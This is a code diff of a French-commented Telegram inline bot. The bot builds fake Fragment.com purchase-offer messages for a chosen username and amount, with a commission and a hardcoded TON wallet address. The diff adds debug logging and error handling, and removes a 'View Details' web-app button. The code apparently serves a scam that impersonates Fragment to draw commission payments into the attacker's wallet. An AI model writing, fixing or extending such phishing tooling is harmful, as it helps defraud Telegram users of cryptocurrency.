@@ -52,21 +52,26 @@ def get_ton_price():
 
 def generate_fragment_message(username, ton_amount):
     """Génère le message Fragment avec formatage identique au bot original"""
-    
-    # Prix TON actuel - récupération en temps réel
-    ton_price = get_ton_price()
-    
-    # Calculs
-    price = float(ton_amount)
-    price_usd = price * ton_price
-    commission = price * 0.05
-    commission_usd = commission * ton_price
-    
-    # Adresse wallet
-    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
-    
-    # Message Fragment - IDENTIQUE au bot original
-    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
+    try:
+        print(f"🔧 DEBUG: Début génération pour {username} - {ton_amount} TON")
+        
+        # Prix TON actuel - récupération en temps réel
+        ton_price = get_ton_price()
+        print(f"🔧 DEBUG: Prix TON récupéré: {ton_price}")
+        
+        # Calculs
+        price = float(ton_amount)
+        price_usd = price * ton_price
+        commission = price * 0.05
+        commission_usd = commission * ton_price
+        
+        print(f"🔧 DEBUG: Calculs - Price: {price}, USD: {price_usd}, Commission: {commission}")
+        
+        # Adresse wallet
+        wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
+        
+        # Message Fragment - Version simplifiée pour éviter les erreurs
+        fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
 • Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
 • Commission: 💎{commission:g} (${commission_usd:.2f} USD)
@@ -82,135 +87,182 @@ Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
 
-    # 📍 CRÉATION DES ENTITÉS (formatting)
-    entities = []
-    
-    # Entité pour @username au début
-    username_start = fragment_message.find(f"@{username}")
-    if username_start != -1:
-        username_entity = MessageEntity(
-            type=MessageEntity.MENTION,
-            offset=username_start,
-            length=len(f"@{username}")
-        )
-        entities.append(username_entity)
-        print(f"👤 Username entity: position {username_start}, longueur {len(f'@{username}')}")
-    
-    # Entité pour l'adresse wallet (monospace)
-    wallet_start = fragment_message.find(wallet_address)
-    if wallet_start != -1:
-        wallet_entity = MessageEntity(
-            type=MessageEntity.CODE,
-            offset=wallet_start,
-            length=len(wallet_address)
-        )
-        entities.append(wallet_entity)
-        print(f"🔗 Wallet entity: position {wallet_start}, longueur {len(wallet_address)}")
-    
-    # 📱 BOUTON UNIQUE - switch_inline_query pour fonctionner partout
-    keyboard = InlineKeyboardMarkup([[
-        InlineKeyboardButton(
-            "View Details", 
-            switch_inline_query=f"webapp {username} {price:g}"
-        )
-    ]])
-    
-    print(f"🔗 Bouton View Details configuré pour webapp {username} {price:g}")
-    
-    return fragment_message, entities, keyboard
+        print(f"🔧 DEBUG: Message généré, longueur: {len(fragment_message)}")
+        
+        # Pas d'entités pour le moment - simplifié
+        entities = []
+        
+        # Pas de clavier pour le moment - simplifié  
+        keyboard = None
+        
+        print(f"✅ DEBUG: Message Fragment généré avec succès pour {username}")
+        return fragment_message, entities, keyboard
+        
+    except Exception as e:
+        print(f"❌ DEBUG: Erreur dans generate_fragment_message: {e}")
+        import traceback
+        print(f"❌ DEBUG: Traceback: {traceback.format_exc()}")
+        raise e
 
 async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gestionnaire des requêtes inline"""
+    print(f"🔍 DEBUG: inline_query_handler appelé")
+    
     try:
         from telegram import InlineQueryResultArticle, InputTextMessageContent
         
         query = update.inline_query.query.strip() if update.inline_query.query else ""
+        print(f"🔍 DEBUG: Requête reçue: '{query}'")
         
-        # Si pas de requête - AUCUNE RÉPONSE (utilisation privée)
+        # Si pas de requête - afficher un message d'aide
         if not query:
-            await update.inline_query.answer([], cache_time=0)
-            return
-        
-        parts = query.split()
-        
-        # 🎯 GESTION DE LA REQUÊTE WEBAPP (déclenchée par le bouton "View Details")
-        if len(parts) >= 3 and parts[0] == "webapp":
-            username = parts[1].replace('@', '')
-            try:
-                ton_amount = float(parts[2])
-                if ton_amount <= 0:
-                    raise ValueError("Montant doit être positif")
-            except ValueError:
-                await update.inline_query.answer([], cache_time=0)
-                return
-            
-            # Génération de la WebApp avec l'URL exacte de votre fichier original
-            webapp_url = f"{WEBAPP_URL}?user={username}&price={ton_amount:g}"
-            current_ton_price = get_ton_price()
-            current_usd_value = ton_amount * current_ton_price
-            
+            print(f"🔍 DEBUG: Pas de query, envoi aide")
             results = [
                 InlineQueryResultArticle(
-                    id=f"webapp_{username}_{ton_amount}_{int(time.time())}",
-                    title=f"📱 Fragment Details: @{username}",
-                    description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
+                    id="help",
+                    title="📝 Format: username montant",
+                    description="Exemple: testuser 100",
                     input_message_content=InputTextMessageContent(
-                        f"🔍 Opening Fragment details for @{username}...\n💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
-                        disable_web_page_preview=True
-                    ),
-                    reply_markup=InlineKeyboardMarkup([[
-                        InlineKeyboardButton(
-                            "View Details", 
-                            web_app=WebAppInfo(url=webapp_url)
-                        )
-                    ]])
+                        "ℹ️ Utilisez le format: @votre_bot username montant\nExemple: @votre_bot testuser 100"
+                    )
                 )
             ]
-            
-            await update.inline_query.answer(results, cache_time=0, is_personal=False)
+            await update.inline_query.answer(results, cache_time=0)
+            print("📤 DEBUG: Aide envoyée avec succès")
             return
         
-        # 🎯 GESTION NORMALE (username montant) - Message Fragment complet
+        # Parsing de la requête (username montant)
+        parts = query.split()
+        print(f"📝 DEBUG: Parties parsées: {parts}")
+        
+        # Si format incorrect - afficher un message d'aide
         if len(parts) < 2:
-            await update.inline_query.answer([], cache_time=0)
+            print(f"🔍 DEBUG: Format incorrect, envoi erreur")
+            results = [
+                InlineQueryResultArticle(
+                    id="error_format",
+                    title="❌ Format incorrect",
+                    description="Utilisez: username montant",
+                    input_message_content=InputTextMessageContent(
+                        f"❌ Format incorrect pour: '{query}'\n\n📝 Format attendu: username montant\nExemple: testuser 100"
+                    )
+                )
+            ]
+            await update.inline_query.answer(results, cache_time=0)
+            print("📤 DEBUG: Erreur format envoyée avec succès")
             return
         
         username = parts[0].replace('@', '')  # Supprime @ si présent
+        print(f"📝 DEBUG: Username extrait: '{username}'")
         
         try:
             ton_amount = float(parts[1])
             if ton_amount <= 0:
                 raise ValueError("Montant doit être positif")
-        except ValueError:
-            await update.inline_query.answer([], cache_time=0)
+            print(f"📝 DEBUG: Montant validé: {ton_amount}")
+        except ValueError as ve:
+            print(f"📝 DEBUG: Erreur validation montant: {ve}")
+            results = [
+                InlineQueryResultArticle(
+                    id="error_amount",
+                    title="❌ Montant invalide",
+                    description=f"'{parts[1]}' n'est pas un nombre valide",
+                    input_message_content=InputTextMessageContent(
+                        f"❌ Montant invalide: '{parts[1]}'\n\n💡 Le montant doit être un nombre positif\nExemple: 100 ou 50.5"
+                    )
+                )
+            ]
+            await update.inline_query.answer(results, cache_time=0)
+            print("📤 DEBUG: Erreur montant envoyée avec succès")
             return
         
-        # Génération du message Fragment avec le bouton unique
-        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
+        print(f"✅ DEBUG: Paramètres validés: '{username}' - {ton_amount} TON")
+        
+        # ÉTAPE CRITIQUE - Génération du message
+        print(f"🔧 DEBUG: Appel de generate_fragment_message...")
+        try:
+            fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
+            print(f"✅ DEBUG: generate_fragment_message terminé avec succès")
+        except Exception as gen_error:
+            print(f"❌ DEBUG: Erreur dans generate_fragment_message: {gen_error}")
+            import traceback
+            print(f"❌ DEBUG: Traceback génération: {traceback.format_exc()}")
+            
+            # Fallback avec message ultra simple
+            results = [
+                InlineQueryResultArticle(
+                    id="error_generation",
+                    title="❌ Erreur de génération",
+                    description="Impossible de créer le message",
+                    input_message_content=InputTextMessageContent(
+                        f"❌ Erreur génération: {str(gen_error)}"
+                    )
+                )
+            ]
+            await update.inline_query.answer(results, cache_time=0)
+            print("📤 DEBUG: Erreur génération envoyée")
+            return
         
         # Prix pour affichage
-        current_ton_price = get_ton_price()
-        current_usd_value = ton_amount * current_ton_price
+        try:
+            current_ton_price = get_ton_price()
+            current_usd_value = ton_amount * current_ton_price
+            print(f"💰 DEBUG: Prix final - {ton_amount} TON = ${current_usd_value:.2f}")
+        except Exception as price_error:
+            print(f"💰 DEBUG: Erreur prix: {price_error}")
+            current_ton_price = 5.50
+            current_usd_value = ton_amount * current_ton_price
         
-        results = [
-            InlineQueryResultArticle(
-                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
-                title=f"Fragment Deal: @{username}",
-                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
-                input_message_content=InputTextMessageContent(
-                    fragment_message,
-                    entities=entities,
-                    disable_web_page_preview=True
-                ),
-                reply_markup=keyboard  # Bouton unique avec switch_inline_query
-            )
-        ]
+        # ÉTAPE CRITIQUE - Création du résultat inline
+        print(f"📤 DEBUG: Création du résultat inline...")
+        try:
+            result_id = f"deal_{username}_{ton_amount}_{int(time.time())}"
+            print(f"📤 DEBUG: ID résultat: {result_id}")
+            
+            results = [
+                InlineQueryResultArticle(
+                    id=result_id,
+                    title=f"Fragment Deal: @{username}",
+                    description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
+                    input_message_content=InputTextMessageContent(
+                        fragment_message,
+                        entities=entities,
+                        disable_web_page_preview=True
+                    ),
+                    reply_markup=keyboard
+                )
+            ]
+            
+            print(f"📤 DEBUG: Résultat créé, envoi en cours...")
+            await update.inline_query.answer(results, cache_time=0)
+            print(f"✅ DEBUG: Réponse inline envoyée avec succès: {username} - {ton_amount} TON")
         
-        await update.inline_query.answer(results, cache_time=0)
+        except Exception as result_error:
+            print(f"❌ DEBUG: Erreur création résultat: {result_error}")
+            import traceback
+            print(f"❌ DEBUG: Traceback résultat: {traceback.format_exc()}")
+            
+            # Fallback ultra simple
+            try:
+                fallback_results = [
+                    InlineQueryResultArticle(
+                        id=f"simple_{username}_{ton_amount}",
+                        title=f"Fragment Deal: @{username}",
+                        description=f"💎 {ton_amount:g} TON",
+                        input_message_content=InputTextMessageContent(
+                            f"Fragment Deal Request\nUsername: @{username}\nAmount: 💎{ton_amount:g} TON"
+                        )
+                    )
+                ]
+                await update.inline_query.answer(fallback_results, cache_time=0)
+                print("📤 DEBUG: Fallback simple envoyé avec succès")
+            except Exception as fallback_error:
+                print(f"❌ DEBUG: Même le fallback a échoué: {fallback_error}")
         
     except Exception as e:
-        print(f"❌ Erreur inline query: {e}")
-        await update.inline_query.answer([], cache_time=0)
+        print(f"❌ DEBUG: Erreur critique dans inline_query_handler: {e}")
+        import traceback
+        print(f"❌ DEBUG: Traceback critique: {traceback.format_exc()}")
 
 class WebhookHandler(BaseHTTPRequestHandler):
     """Gestionnaire webhook HTTP simple"""
@@ -256,7 +308,7 @@ class WebhookHandler(BaseHTTPRequestHandler):
         self.send_header('Content-Type', 'text/plain')
         self.end_headers()
         
-        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
+        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App: {WEBAPP_URL}"
         self.wfile.write(status.encode('utf-8'))
     
     def log_message(self, format, *args):
